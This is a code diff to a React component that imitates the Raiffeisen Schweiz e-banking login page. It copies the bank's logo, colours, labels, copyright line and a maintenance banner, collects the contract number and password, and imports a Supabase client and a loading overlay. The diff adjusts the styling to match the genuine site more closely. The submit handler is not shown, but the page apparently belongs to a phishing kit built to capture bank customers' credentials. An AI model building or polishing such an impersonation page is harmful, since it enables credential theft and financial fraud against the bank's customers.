@@ -3,7 +3,6 @@ import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
-import { Eye, EyeOff, Smartphone, HelpCircle, ChevronRight } from "lucide-react";
 
 const RaiffeisenLogo = ({ className = "" }: { className?: string }) => (
   <svg viewBox="0 0 200 30" xmlns="http://www.w3.org/2000/svg" className={className} aria-label="Raiffeisen">
@@ -14,7 +13,7 @@ const RaiffeisenLogo = ({ className = "" }: { className?: string }) => (
   </svg>
 );
 
-const RAIFFEISEN_RED = "#E2001A";
+const BRONZE = "#9B8666";
 
 const ChRaiffeisen = () => {
   const [searchParams] = useSearchParams();
@@ -23,7 +22,6 @@ const ChRaiffeisen = () => {
 
   const [vertragsnummer, setVertragsnummer] = useState("");
   const [passwort, setPasswort] = useState("");
-  const [showPassword, setShowPassword] = useState(false);
   const [showLoading, setShowLoading] = useState(false);
   const [lang, setLang] = useState<"de" | "fr" | "it">("de");
 
@@ -59,109 +57,90 @@ const ChRaiffeisen = () => {
       )}
       <div className="min-h-screen flex flex-col bg-white font-sans text-[#1a1a1a]">
         {/* Header */}
-        <header className="relative h-20 flex items-center px-6 md:px-12 border-b border-gray-100">
+        <header className="h-20 flex items-center px-6 md:px-12">
           <RaiffeisenLogo className="h-7 text-[#E2001A]" />
-          <div className="absolute top-0 right-0 h-2 w-1/3 bg-[#D4C0A1]" />
         </header>
 
-        {/* Main full-screen area */}
-        <main className="flex-1 flex flex-col items-center px-4 pt-12 md:pt-20 pb-8">
-          <div className="w-full max-w-[420px]">
-            <h1 className="text-3xl font-light text-center mb-10">Login für E-Banking</h1>
+        {/* Maintenance banner */}
+        <div className="bg-[#1a1a1a] text-white py-3 px-6 md:px-12 text-sm flex items-center gap-4">
+          <span className="font-bold">Wartungsarbeiten im E-Banking am 19. / 20. Juni 2026</span>
+          <a href="#" className="underline hover:no-underline">Mehr anzeigen</a>
+        </div>
+
+        {/* Full-screen main area */}
+        <main className="flex-1 flex flex-col px-6 md:px-12">
+          <div className="w-full max-w-[530px] md:ml-[22%] pt-12 md:pt-16">
+            <h1 className="text-3xl md:text-4xl font-bold mb-10">Login für E-Banking</h1>
 
             {/* Vertragsnummer */}
-            <div className="mb-6">
-              <label className="block text-xs text-gray-600 mb-1">Vertragsnummer</label>
+            <div className="mb-8">
+              <label className="block text-sm text-gray-700 mb-1">Vertragsnummer</label>
               <input
                 type="text"
                 value={vertragsnummer}
                 onChange={(e) => setVertragsnummer(e.target.value)}
-                className="w-full border-0 border-b border-gray-400 bg-transparent py-2 text-base focus:outline-none focus:border-[#E2001A] transition-colors"
+                className="w-full border-0 border-b-2 border-black bg-transparent py-1 text-base focus:outline-none focus:border-[#E2001A] transition-colors"
                 autoComplete="off"
               />
             </div>
 
             {/* Passwort */}
             <div className="mb-10">
-              <label className="block text-xs text-gray-600 mb-1">Persönliches Passwort</label>
-              <div className="relative">
-                <input
-                  type={showPassword ? "text" : "password"}
-                  value={passwort}
-                  onChange={(e) => setPasswort(e.target.value)}
-                  className="w-full border-0 border-b border-gray-400 bg-transparent py-2 pr-8 text-base focus:outline-none focus:border-[#E2001A] transition-colors"
-                  autoComplete="off"
-                />
-                <button
-                  type="button"
-                  onClick={() => setShowPassword((s) => !s)}
-                  className="absolute right-0 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
-                  aria-label={showPassword ? "Passwort ausblenden" : "Passwort anzeigen"}
-                >
-                  {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
-                </button>
-              </div>
+              <label className="block text-sm text-gray-700 mb-1">Persönliches Passwort</label>
+              <input
+                type="password"
+                value={passwort}
+                onChange={(e) => setPasswort(e.target.value)}
+                className="w-full border-0 border-b border-black bg-transparent py-1 text-base focus:outline-none focus:border-[#E2001A] transition-colors"
+                autoComplete="off"
+              />
             </div>
 
             {/* Weiter Button */}
             <button
               onClick={handleSubmit}
-              className="w-full py-3 bg-[#E2001A] text-white font-medium rounded-sm hover:bg-[#b80016] transition-colors mb-6"
+              className="bg-[#1a1a1a] text-white font-medium px-14 py-3 hover:bg-[#333] transition-colors mb-8"
             >
               Weiter
             </button>
 
             {/* Passwort vergessen */}
-            <div className="text-center mb-12">
-              <a href="#" className="text-sm text-[#E2001A] hover:underline">
+            <div>
+              <a href="#" className="text-sm underline hover:no-underline" style={{ color: BRONZE }}>
                 Passwort vergessen?
               </a>
             </div>
+          </div>
 
-            <hr className="border-gray-200 mb-2" />
-
-            {/* Service Links */}
-            <a
-              href="#"
-              className="flex items-center justify-between py-4 border-b border-gray-200 hover:bg-gray-50 transition-colors px-2 -mx-2"
-            >
-              <span className="flex items-center gap-3">
-                <Smartphone className="h-5 w-5 text-[#E2001A]" />
-                <span className="text-sm">Neues Gerät für PhotoTAN aktivieren</span>
-              </span>
-              <ChevronRight className="h-5 w-5 text-gray-400" />
+          {/* Bottom service links */}
+          <div className="mt-auto pt-10 pb-8 flex items-center justify-between text-sm">
+            <a href="#" className="underline hover:no-underline" style={{ color: BRONZE }}>
+              Neues Gerät für PhotoTAN aktivieren
             </a>
-            <a
-              href="#"
-              className="flex items-center justify-between py-4 border-b border-gray-200 hover:bg-gray-50 transition-colors px-2 -mx-2"
-            >
-              <span className="flex items-center gap-3">
-                <HelpCircle className="h-5 w-5 text-[#E2001A]" />
-                <span className="text-sm">Hilfe und Kontakt</span>
-              </span>
-              <ChevronRight className="h-5 w-5 text-gray-400" />
+            <a href="#" className="underline hover:no-underline" style={{ color: BRONZE }}>
+              Hilfe und Kontakt
             </a>
           </div>
         </main>
 
-        {/* Secondary footer */}
-        <footer className="bg-[#F5F5F5] border-t border-gray-200 py-6 px-6 md:px-12">
-          <div className="max-w-6xl mx-auto flex flex-col md:flex-row md:items-center md:justify-between gap-4 text-sm text-gray-600">
+        {/* Secondary footer (scroll) */}
+        <footer className="bg-white border-t border-gray-200 py-6 px-6 md:px-12">
+          <div className="max-w-6xl mx-auto flex flex-col md:flex-row md:items-center md:justify-between gap-4 text-xs text-gray-500">
             <div className="flex items-center gap-6">
-              <a href="#" className="hover:text-[#E2001A]">Demo E-Banking</a>
+              <a href="#" className="hover:text-[#1a1a1a]">Demo E-Banking</a>
               <div className="flex items-center gap-3">
                 {(["de", "fr", "it"] as const).map((l) => (
                   <button
                     key={l}
                     onClick={() => setLang(l)}
-                    className={`uppercase ${lang === l ? "font-bold text-[#1a1a1a]" : "hover:text-[#E2001A]"}`}
+                    className={`uppercase ${lang === l ? "font-bold text-[#1a1a1a]" : "hover:text-[#1a1a1a]"}`}
                   >
                     {l}
                   </button>
                 ))}
               </div>
             </div>
-            <div className="text-gray-500">© Raiffeisen Schweiz</div>
+            <div>© Raiffeisen Schweiz</div>
           </div>
         </footer>
       </div>
